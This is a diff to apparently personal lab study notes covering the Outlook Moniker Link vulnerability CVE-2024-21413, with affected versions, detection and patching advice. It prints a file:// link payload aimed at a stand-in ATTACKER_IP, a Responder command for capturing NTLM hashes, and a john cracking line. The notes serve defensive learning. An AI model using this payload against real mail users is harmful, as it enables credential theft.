@@ -3213,39 +3213,95 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
 
 ### Room 1 - Moniker Link (CVE-2024-21413)
 
+**Learning Objectives**
+- Understand how the Moniker Link vulnerability works
+- Learn about Outlook’s Protected View
+- Exploit the vulnerability to capture NTLM hashes
+- Review detection and remediation methods
 
+---
 
+#### Vulnerability Overview
 
+| Detail | Information |
+|--------|-------------|
+| **CVE** | CVE-2024-21413 |
+| **Publish Date** | February 13, 2024 |
+| **Impact** | Remote Code Execution & Credential Leak |
+| **Severity** | Critical (CVSS 9.8) |
+| **Attack Complexity** | Low |
+| **Discovered by** | Haifei Li (Check Point Research) |
 
+**Affected Versions:**
+- Microsoft Office LTSC 2021 (from 19.0.0)
+- Microsoft 365 Apps for Enterprise (from 16.0.1)
+- Microsoft Office 2019 (from 16.0.1)
+- Microsoft Office 2016 (from 16.0.0 before 16.0.5435.1001)
 
+---
 
+#### How the Vulnerability Works
 
+Outlook can render HTML emails and process special hyperlinks called **Moniker Links**.
 
+Normally, when Outlook encounters a link like:
+```html
+<a href="file://ATTACKER_IP/share">Click me</a>
+```
 
+it triggers Protected View, which blocks the action and shows a security warning. The Bypass:
 
+Adding a ! character followed by any text bypasses Protected View:
 
+```HTML
+<a href="file://ATTACKER_IP/share!exploit">Click me</a>
+```
 
+When the victim clicks the link:
+1. Outlook attempts to access the remote file via SMB
+2. Windows automatically tries to authenticate
+3. The victim’s netNTLMv2 hash is sent to the attacker
 
+---
 
+#### Exploitation Steps
 
+1. Start Responder (to capture the hash):
+```Bash
+responder -I ens5
+```
 
+2. Send a malicious email containing the Moniker Link using a simple Python SMTP script. Key part of the payload:
+```HTML
+<a href="file://ATTACKER_IP/test!exploit">Click me</a>
+```
 
+3. Victim opens the email and clicks the link
+4. Capture the netNTLMv2 hash in Responder.
 
+---
 
+#### Detection
 
+* YARA rule exists (created by Florian Roth) to detect emails containing file:// Moniker Links with the bypass pattern.
+* Wireshark can show the SMB authentication attempt and truncated netNTLMv2 hash.
 
+---
 
+#### Remediation
 
+* Apply the official Microsoft patches from February 2024 Patch Tuesday.
+* Update Microsoft Office through Windows Update or the Microsoft Update Catalog.
+* User awareness:
+  * Do not click suspicious links
+  * Preview links before clicking
+  * Report suspicious emails
 
+**Note:** There is no configuration change in Outlook that prevents this bypass of Protected View. Patching is the only reliable fix.
 
+---
 
-
-
-
-
-
-
-
+**End of Room 1**
 
 </details> <!-- Ends Room 1 -->
 
@@ -3255,6 +3311,40 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
 <summary><strong>Room 2 - Metasploit: Introduction</strong></summary>
 
 ### Room 2 - Metasploit: Introduction
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </details> <!-- Ends Room 2 -->
 
